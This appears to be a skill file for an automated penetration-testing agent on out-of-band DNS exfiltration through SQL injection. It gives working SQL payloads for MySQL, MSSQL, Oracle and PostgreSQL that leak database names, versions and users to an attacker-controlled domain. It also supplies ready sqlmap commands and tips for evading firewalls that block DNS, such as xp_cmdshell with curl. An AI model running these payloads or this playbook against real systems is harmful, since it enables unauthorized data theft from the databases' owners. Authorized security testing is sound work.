# Skill: Out-of-Band (OOB) / DNS Exfiltration

## Metadata
- Phase: detection
- Techniques: Q
- DB Targets: MySQL (Windows), MSSQL, Oracle, PostgreSQL
- Risk Level: medium
- Prerequisites: control over a DNS server, target must make outbound DNS requests

## When to Use

Use OOB when:
- Time-based blind is the only alternative (slow)
- You control a DNS server or domain
- Target server can make outbound DNS requests (not always blocked by firewall)
- You need to extract large amounts of data quickly

**OOB is ~30x faster than time-based blind** because data is transmitted via DNS queries to your server rather than extracted bit by bit from response timing.

## How OOB/DNS Exfiltration Works

1. You control a DNS server for `attacker.com`
2. Injection causes the database to construct queries containing data as subdomains
3. Database resolves `stolen-data.attacker.com` -> your DNS server logs it
4. SQLMap runs a fake DNS server that captures the exfiltrated data

```sql
-- MySQL (Windows, uses UNC path)
LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))

-- MSSQL
EXEC master..xp_dirtree '//'+@@version+'.attacker.com/test'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://'||user||'.attacker.com') FROM DUAL
```

## Setup Requirements

### 1. DNS Server Setup

Option A: SQLMap built-in DNS server (needs root/admin):
```bash
sudo sqlmap -u "TARGET" --dns-domain=attacker.com --technique=Q
```

Option B: Dedicated DNS server (interactsh, Burp Collaborator, canarytokens.org):
```bash
# Using interactsh
interactsh-client
# Note the generated domain (e.g., abc123.interactsh.com)
```

### 2. Domain Requirements
- Own a domain or subdomain
- NS records pointed to your server
- Firewall allows inbound UDP/TCP port 53

## Minimum Viable Command

```bash
sudo sqlmap -u "http://target.com/page.php?id=1" \
  --technique=Q \
  --dns-domain=yourdomain.com \
  --batch
```

## Recommended Full Command

```bash
sudo sqlmap -u "http://target.com/page.php?id=1" \
  --technique=Q \
  --dns-domain=yourdomain.com \
  --dbms=mysql \
  --batch \
  --threads=5 \
  -v 3
```

## DBMS-Specific OOB Payloads

### MySQL (Windows only - uses UNC)
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))
```

### MSSQL (Most reliable for OOB)
```sql
EXEC master..xp_dirtree '//'+database()+'.attacker.com/a'
EXEC master..xp_fileexist '//'+@@version+'.attacker.com/a'
```

### Oracle
```sql
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com') FROM DUAL
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM DUAL
```

### PostgreSQL
```sql
COPY (SELECT 'a') TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'
```

## Speed Comparison

| Technique | Chars per Request | Extract 50-char string |
|-----------|------------------|----------------------|
| Time-based blind | ~7 requests/char | ~50 requests (5+ min) |
| OOB/DNS | 1 DNS query/value | 1-3 queries (<10 sec) |

## Step-by-Step

1. Obtain a domain and set up DNS server (or use Burp Collaborator)
2. Verify outbound DNS from target is not blocked
3. Run SQLMap with `--dns-domain`
4. Watch DNS logs for incoming queries containing exfiltrated data

## Expected Output
```
[INFO] testing out-of-band data retrieval with DNS requests
[INFO] DNS query for 'mysql.attacker.com' received from target
[INFO] back-end DBMS: MySQL 8.0.32
```

## Firewall Evasion for DNS

If outbound DNS is blocked:
- Try HTTP instead of DNS (Oracle UTL_HTTP, MSSQL xp_cmdshell + curl)
- Try ICMP (if ping is allowed outbound)
- Use port 53 UDP/TCP (most commonly allowed)
- Try HTTPS to bypass DPI

## Red Flags (wrong skill)
- Linux MySQL target -> UNC path doesn't work on Linux, use MSSQL/Oracle or time-based
- Outbound DNS blocked -> use HTTP-based OOB or fall back to time-based
- SQLMap reports "not vulnerable to OOB" with domain set -> try different DBMS-specific payload

## Follow-Up
- OOB working -> fast data extraction via [Database Enumeration](../03_exploitation/database_enumeration.md)
- DNS blocked -> [Time-Based Blind](time_blind.md) (slower alternative)
